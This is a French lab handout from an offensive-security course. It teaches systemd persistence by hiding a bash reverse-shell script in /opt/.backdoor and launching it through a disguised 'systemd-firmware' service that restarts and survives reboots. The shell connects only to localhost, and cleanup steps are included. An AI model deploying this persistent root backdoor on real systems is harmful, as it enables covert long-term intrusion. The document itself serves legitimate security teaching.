

# **TP Offensif – Persistance via `systemd` (1 machine locale)**

**Cours : Cybersécurité Offensive – TP sur les services malveillants**

---

## **Résumé pédagogique**

Vous allez créer un **faux service systemd** sur **Ubuntu 22.04**, qui lance un **reverse shell local** vers `127.0.0.1:4444` (donc la machine elle-même).
Vous écouterez le port avec `nc` pour **voir le shell apparaître** à chaque exécution du service, **même après un reboot**.

---

## **Matériel requis**

* **1 seule machine virtuelle Ubuntu 22.04 Desktop ou Server**
* Aucun accès Internet requis
* Aucun réseau requis
* 2 terminaux ouverts en parallèle

---

## **Schéma logique ASCII**

```
+----------------------------------------------------------+
|  Machine Ubuntu 22.04 (unique)                           |
|                                                          |
|  [Terminal 1 - Attaquant local]                          |
|     nc -lvnp 4444   <== Shell Bash (reverse)             |
|                                                          |
|  [Terminal 2 - Service]                                  |
|     systemd --> bash -> /dev/tcp/127.0.0.1:4444          |
+----------------------------------------------------------+
```

---

# **Étapes détaillées**

---

## **Étape 1 – Préparation de l’écoute (terminal 1)**

Ouvrez un terminal, tapez :

```bash
nc -lvnp 4444
```

Laissez ce terminal ouvert. Vous attendez une connexion.

---

## **Étape 2 – Création du script malveillant (terminal 2)**

1. Créez un dossier discret :

```bash
sudo mkdir -p /opt/.backdoor/
```

2. Créez le script :

```bash
sudo nano /opt/.backdoor/reverse.sh
```

3. Collez ce contenu :

```bash
#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

4. Enregistrez et quittez (`Ctrl+O`, `Enter`, `Ctrl+X`).

5. Rendez le script exécutable :

```bash
sudo chmod +x /opt/.backdoor/reverse.sh
```

---

## **Étape 3 – Création du faux service systemd**

1. Créez le fichier :

```bash
sudo nano /etc/systemd/system/systemd-firmware.service
```

2. Collez ce contenu :

```ini
[Unit]
Description=Firmware Sync Service
After=network.target

[Service]
ExecStart=/opt/.backdoor/reverse.sh
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

3. Enregistrez et quittez.

---

## **Étape 4 – Activation du service**

1. Recharger systemd :

```bash
sudo systemctl daemon-reload
```

2. Activer au démarrage :

```bash
sudo systemctl enable systemd-firmware
```

3. Démarrer immédiatement :

```bash
sudo systemctl start systemd-firmware
```

---

## **Étape 5 – Observer le shell**

Retournez dans le **terminal 1** (où `nc` est en attente).
Vous devriez voir apparaître :

```
Connection from 127.0.0.1
bash-5.1$
```

Tapez :

```bash
whoami
```

La réponse sera :

```
root
```

Vous avez donc **obtenu un shell root**, lancé par le service systemd.

---

## **Étape 6 – Test de persistance**

1. Fermez le terminal 1 (`Ctrl+C`)
2. Redémarrez la machine :

```bash
sudo reboot
```

3. Une fois redémarrée, ouvrez immédiatement un terminal et relancez :

```bash
nc -lvnp 4444
```

En quelques secondes, le shell s’ouvre **automatiquement**.
C’est la **preuve que le service est persistant**.

---

## **Étape 7 – Analyse**

1. Afficher l’état du service :

```bash
systemctl status systemd-firmware
```

2. Afficher le contenu :

```bash
systemctl cat systemd-firmware
```

3. Consulter les logs :

```bash
journalctl -u systemd-firmware
```

---

## **Étape 8 – Suppression et désinfection**

```bash
sudo systemctl stop systemd-firmware
sudo systemctl disable systemd-firmware
sudo rm /etc/systemd/system/systemd-firmware.service
sudo rm -rf /opt/.backdoor/
sudo systemctl daemon-reload
```

Vérification :

```bash
systemctl list-units --type=service | grep firmware
```

Aucune sortie = suppression réussie.

---

## **À quoi sert cette attaque ?**

Elle permet à un attaquant qui a obtenu une fois l’accès root :

* De **rester dans le système discrètement**
* De **reprendre le contrôle après redémarrage**
* D’utiliser un **mécanisme système légitime** (`systemd`)
* De **camoufler l’exécution** dans les services
